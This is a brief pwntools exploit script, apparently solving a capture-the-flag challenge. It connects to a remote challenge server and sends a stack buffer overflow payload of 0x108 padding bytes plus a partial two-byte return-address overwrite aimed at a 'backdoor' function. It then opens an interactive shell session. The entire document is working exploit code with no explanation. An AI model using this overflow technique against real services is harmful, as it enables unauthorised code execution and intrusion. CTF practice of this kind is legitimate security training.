from pwn import *

io = remote("node5.anna.nssctf.cn", 28791)

context.log_level = 'debug'
backdoor = 0x11e5

io.recvuntil(b"challenge")
io.send(b"a" * (0x100 + 0x8) + p16(backdoor))
io.interactive()

